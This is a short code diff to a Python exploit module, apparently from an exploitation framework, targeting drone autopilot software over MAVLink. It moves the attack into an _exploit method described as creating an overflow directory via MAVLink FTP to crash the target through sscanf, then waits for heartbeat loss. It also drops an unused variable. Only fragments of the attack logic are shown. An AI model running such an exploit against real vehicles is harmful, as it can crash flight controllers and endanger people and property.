@@ -193,6 +193,10 @@ class Exploit(Exploit):
         if not self._validate():
             return
 
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: create overflow directory via MAVLink FTP and trigger sscanf crash."""
         target_ip = str(self.target).strip()
         target_port = int(self.port)
         target_sys = int(self.target_sys)
@@ -229,7 +233,6 @@ class Exploit(Exploit):
                 time.sleep(0.3)
 
             print_status("Waiting for MAVLink task crash (telemetry/heartbeat loss)...")
-            start = time.time()
             received_heartbeat = False
             deadline = time.time() + 5.0
             while time.time() < deadline:
